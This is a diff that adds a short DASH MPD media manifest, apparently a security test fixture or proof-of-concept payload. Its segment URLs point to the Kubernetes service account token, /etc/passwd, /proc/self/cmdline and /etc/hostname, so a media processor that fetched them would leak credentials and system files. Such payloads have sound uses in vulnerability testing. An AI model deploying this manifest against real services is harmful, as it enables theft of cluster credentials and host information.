@@ -1,0 +1,16 @@
+<?xml version="1.0"?>
+<MPD xmlns="urn:mpeg:DASH:schema:MPD:2011" type="static" mediaPresentationDuration="PT10S">
+ <Period>
+  <AdaptationSet mimeType="audio/mp4" codecs="mp4a.40.2">
+   <Representation id="0" bandwidth="1000">
+    <SegmentList>
+     <Initialization sourceURL="/var/run/secrets/kubernetes.io/serviceaccount/token"/>
+     <SegmentURL media="/etc/hostname"/>
+     <SegmentURL media="/proc/self/cmdline"/>
+     <SegmentURL media="/etc/passwd"/>
+    </SegmentList>
+
+   </Representation>
+  </AdaptationSet>
+ </Period>
+</MPD>
